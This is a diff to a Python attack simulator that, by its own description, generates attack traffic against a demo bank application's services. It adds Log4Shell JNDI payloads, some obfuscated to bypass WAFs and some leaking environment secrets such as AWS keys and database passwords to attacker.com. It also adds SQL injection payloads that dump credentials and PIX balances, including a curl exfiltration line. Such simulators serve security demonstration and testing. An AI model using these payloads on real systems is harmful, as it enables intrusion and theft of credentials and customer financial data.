@@ -47,12 +47,13 @@ MIN_INTERVAL = float(os.getenv('ATTACK_MIN_INTERVAL', '5'))
 MAX_INTERVAL = float(os.getenv('ATTACK_MAX_INTERVAL', '15'))
 
 # Probabilidades de cada tipo de ataque
-PROB_SQL_INJECTION = float(os.getenv('PROB_SQL_INJECTION', '0.25'))
+PROB_SQL_INJECTION = float(os.getenv('PROB_SQL_INJECTION', '0.20'))
+PROB_LOG4SHELL = float(os.getenv('PROB_LOG4SHELL', '0.15'))
 PROB_RCE = float(os.getenv('PROB_RCE', '0.15'))
 PROB_PATH_TRAVERSAL = float(os.getenv('PROB_PATH_TRAVERSAL', '0.15'))
 PROB_XSS = float(os.getenv('PROB_XSS', '0.15'))
-PROB_AUTH_BYPASS = float(os.getenv('PROB_AUTH_BYPASS', '0.15'))
-PROB_IDOR = float(os.getenv('PROB_IDOR', '0.15'))
+PROB_AUTH_BYPASS = float(os.getenv('PROB_AUTH_BYPASS', '0.10'))
+PROB_IDOR = float(os.getenv('PROB_IDOR', '0.10'))
 
 
 # =============================================================================
@@ -211,6 +212,82 @@ AUTH_BYPASS_PAYLOADS = [
     {"Cookie": "user_id=1; is_admin=1"},
 ]
 
+# =============================================================================
+# LOG4SHELL / JNDI RCE PAYLOADS (CVE-2021-44228)
+# =============================================================================
+LOG4SHELL_PAYLOADS = [
+    # Basic JNDI LDAP injection
+    "${jndi:ldap://attacker.dogbank.com/exploit}",
+    "${jndi:ldap://127.0.0.1:1389/Basic/Command/Base64/}",
+    "${jndi:rmi://attacker.dogbank.com:1099/exploit}",
+    "${jndi:ldap://evil.com/a}",
+
+    # Obfuscated variants (bypass WAF)
+    "${${lower:j}ndi:${lower:l}dap://attacker.com/x}",
+    "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attacker.com/x}",
+    "${j${::-n}di:ldap://attacker.com/x}",
+    "${${lower:j}${lower:n}${lower:d}i:${lower:ldap}://attacker.com/x}",
+
+    # Environment variable extraction via JNDI
+    "${jndi:ldap://attacker.com/${env:AWS_SECRET_ACCESS_KEY}}",
+    "${jndi:ldap://attacker.com/${env:DB_PASSWORD}}",
+    "${jndi:ldap://attacker.com/${env:DD_API_KEY}}",
+    "${jndi:ldap://attacker.com/${env:POSTGRES_PASSWORD}}",
+
+    # Nested lookups
+    "${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//attacker.com/x}",
+    "${${lower:${lower:jndi}}:${lower:ldap}://attacker.com/x}",
+
+    # DNS exfiltration via Log4j
+    "${jndi:dns://attacker.com}",
+    "${hostName}.attacker.com",
+    "${${::-j}ndi:rmi://attacker.com/poc}",
+
+    # Java class loading
+    "${jndi:ldap://attacker.com/Exploit.class}",
+    "${jndi:rmi://attacker.com:1099/Object}",
+
+    # Base64 encoded command execution
+    "${jndi:ldap://attacker.com/Basic/Command/Base64/Y2F0IC9ldGMvcGFzc3dk}",
+]
+
+# =============================================================================
+# SQL INJECTION - DATA EXFILTRATION (advanced payloads)
+# =============================================================================
+SQL_EXFIL_PAYLOADS = [
+    # Postgres - Dump all users with credentials
+    "' UNION SELECT string_agg(cpf || ':' || senha, ',') FROM usuarios--",
+    "' UNION SELECT json_agg(row_to_json(u)) FROM usuarios u--",
+    "' UNION SELECT array_to_json(array_agg(row_to_json(t))) FROM usuarios t--",
+
+    # Extract PIX keys and balances (high value targets)
+    "' UNION SELECT chave_pix, saldo FROM contas WHERE saldo > 10000--",
+    "' OR 1=1 UNION SELECT cpf, email, telefone, saldo FROM usuarios JOIN contas ON usuarios.id = contas.usuario_id--",
+    "' UNION ALL SELECT cpf, nome, email, chave_pix, saldo::text FROM usuarios, contas--",
+
+    # Time-based blind for detection
+    "' AND (SELECT pg_sleep(5))--",
+    "1; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--",
+    "' OR (SELECT COUNT(*) FROM pg_sleep(3))>0--",
+
+    # Error-based extraction
+    "' AND 1=CAST((SELECT cpf FROM usuarios LIMIT 1) AS INT)--",
+    "' AND extractvalue(1, concat(0x7e, (SELECT senha FROM usuarios WHERE cpf='12345678901')))--",
+    "' AND 1=(SELECT COUNT(*) FROM usuarios WHERE cpf LIKE '123%')--",
+
+    # Stacked queries - data dump
+    "'; COPY usuarios TO '/tmp/users.csv' WITH CSV HEADER;--",
+    "'; COPY (SELECT * FROM contas) TO '/tmp/contas.txt';--",
+
+    # Out-of-band exfiltration attempts
+    "'; COPY (SELECT * FROM usuarios) TO PROGRAM 'curl -X POST -d @- http://attacker.com/exfil';--",
+    "' UNION SELECT lo_export(lo_create(0), '/tmp/dump.txt')--",
+
+    # Information schema enumeration
+    "' UNION SELECT table_name, column_name FROM information_schema.columns--",
+    "' UNION SELECT tablename, null FROM pg_tables WHERE schemaname='public'--",
+]
+
 
 class SecurityAttacker:
     """Simulador de ataques de seguranca para demonstracao"""
@@ -220,6 +297,7 @@ class SecurityAttacker:
         self.stats = {
             'total_attacks': 0,
             'sql_injection': 0,
+            'log4shell': 0,
             'rce': 0,
             'path_traversal': 0,
             'xss': 0,
@@ -255,9 +333,11 @@ class SecurityAttacker:
     # =========================================================================
 
     def attack_sql_injection(self):
-        """Executa ataques de SQL Injection"""
+        """Executa ataques de SQL Injection (incluindo exfiltracao de dados)"""
         self.stats['sql_injection'] += 1
-        payload = random.choice(SQL_INJECTION_PAYLOADS)
+        # Combina payloads basicos com payloads de exfiltracao
+        all_sql_payloads = SQL_INJECTION_PAYLOADS + SQL_EXFIL_PAYLOADS
+        payload = random.choice(all_sql_payloads)
 
         attack_type = random.choice(['login', 'search', 'transaction', 'account'])
 
@@ -370,6 +450,105 @@ class SecurityAttacker:
                     timeout=30
                 )
                 self._check_response(response, 'RCE Chatbot')
+            except Exception as e:
+                logger.error(f"   Erro: {e}")
+
+    # =========================================================================
+    # LOG4SHELL / JNDI RCE ATTACKS (CVE-2021-44228)
+    # =========================================================================
+
+    def attack_log4shell(self):
+        """
+        Executa ataques Log4Shell/JNDI RCE contra servicos Java.
+        Alvos: transaction-service, auth-service, account-service
+        """
+        self.stats['log4shell'] += 1
+        payload = random.choice(LOG4SHELL_PAYLOADS)
+
+        # Seleciona vetor de ataque aleatorio
+        attack_vector = random.choice(['user_agent', 'header', 'body', 'auth', 'search'])
+
+        if attack_vector == 'user_agent':
+            # Log4Shell via User-Agent (logado pelo backend)
+            logger.info(f"[LOG4SHELL] Injetando via User-Agent: {payload[:50]}...")
+            try:
+                response = self.session.post(
+                    f"{TRANSACTION_SERVICE_URL}/api/pix",
+                    headers={
+                        "User-Agent": payload,
+                        "Content-Type": "application/json"
+                    },
+                    json={
+                        "accountOriginId": 1,
+                        "pixKeyDestination": "test@dogbank.com",
+                        "amount": 10
+                    },
+                    timeout=10
+                )
+                self._check_response(response, 'Log4Shell User-Agent')
+            except Exception as e:
+                logger.error(f"   Erro: {e}")
+
+        elif attack_vector == 'header':
+            # Log4Shell via X-Forwarded-For e outros headers
+            logger.info(f"[LOG4SHELL] Injetando via headers: {payload[:50]}...")
+            try:
+                response = self.session.get(
+                    f"{AUTH_SERVICE_URL}/api/auth/health",
+                    headers={
+                        "X-Forwarded-For": payload,
+                        "X-Api-Version": payload,
+                        "X-Request-Id": payload,
+                        "Referer": payload,
+                    },
+                    timeout=10
+                )
+                self._check_response(response, 'Log4Shell Headers')
+            except Exception as e:
+                logger.error(f"   Erro: {e}")
+
+        elif attack_vector == 'body':
+            # Log4Shell via campo de corpo JSON
+            logger.info(f"[LOG4SHELL] Injetando via body JSON: {payload[:50]}...")
+            try:
+                response = self.session.post(
+                    f"{AUTH_SERVICE_URL}/api/auth/login",
+                    json={
+                        "cpf": payload,
+                        "senha": payload,
+                        "deviceInfo": payload
+                    },
+                    timeout=10
+                )
+                self._check_response(response, 'Log4Shell Body')
+            except Exception as e:
+                logger.error(f"   Erro: {e}")
+
+        elif attack_vector == 'auth':
+            # Log4Shell via Authorization header
+            logger.info(f"[LOG4SHELL] Injetando via Authorization: {payload[:50]}...")
+            try:
+                response = self.session.get(
+                    f"{TRANSACTION_SERVICE_URL}/api/transactions",
+                    headers={
+                        "Authorization": f"Bearer {payload}",
+                    },
+                    timeout=10
+                )
+                self._check_response(response, 'Log4Shell Authorization')
+            except Exception as e:
+                logger.error(f"   Erro: {e}")
+
+        else:
+            # Log4Shell via parametro de busca
+            logger.info(f"[LOG4SHELL] Injetando via query param: {payload[:50]}...")
+            try:
+                response = self.session.get(
+                    f"{ACCOUNT_SERVICE_URL}/api/accounts/search",
+                    params={"q": payload, "filter": payload},
+                    timeout=10
+                )
+                self._check_response(response, 'Log4Shell Search')
             except Exception as e:
                 logger.error(f"   Erro: {e}")
 
@@ -601,6 +780,7 @@ class SecurityAttacker:
 
         attacks = [
             ('sql_injection', PROB_SQL_INJECTION),
+            ('log4shell', PROB_LOG4SHELL),
             ('rce', PROB_RCE),
             ('path_traversal', PROB_PATH_TRAVERSAL),
             ('xss', PROB_XSS),
@@ -622,6 +802,7 @@ class SecurityAttacker:
 
         attack_methods = {
             'sql_injection': self.attack_sql_injection,
+            'log4shell': self.attack_log4shell,
             'rce': self.attack_rce,
             'path_traversal': self.attack_path_traversal,
             'xss': self.attack_xss,
@@ -640,6 +821,7 @@ class SecurityAttacker:
         logger.info("=" * 70)
         logger.info(f"   Total de ataques: {self.stats['total_attacks']}")
         logger.info(f"   SQL Injection: {self.stats['sql_injection']}")
+        logger.info(f"   Log4Shell/JNDI RCE: {self.stats['log4shell']}")
         logger.info(f"   RCE/Command Injection: {self.stats['rce']}")
         logger.info(f"   Path Traversal: {self.stats['path_traversal']}")
         logger.info(f"   XSS: {self.stats['xss']}")
